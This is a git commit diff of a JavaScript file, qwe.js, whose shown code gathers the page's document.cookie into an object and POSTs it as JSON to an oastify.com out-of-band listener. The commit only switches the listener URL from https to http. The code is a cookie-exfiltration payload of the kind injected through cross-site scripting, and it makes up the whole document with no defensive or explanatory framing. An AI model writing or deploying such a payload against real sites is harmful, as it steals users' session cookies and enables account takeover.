6556db3d1e1f097f0fb10db6e2a83d65fe27336e
Masoud <101927419+bolka64@users.noreply.github.com>
2025-11-12 12:48:55 +0330

    Update qwe.js

--- qwe.js
+++ qwe.js
@@ -4,7 +4,7 @@ const info = {
   cookie: document.cookie
 };
 
-fetch("https://t3xd8evnpec2yy7fz0p13pgc43auyqmf.oastify.com", {
+fetch("http://t3xd8evnpec2yy7fz0p13pgc43auyqmf.oastify.com", {
   method: "POST",
   headers: { "Content-Type": "application/json" },
   body: JSON.stringify(info)
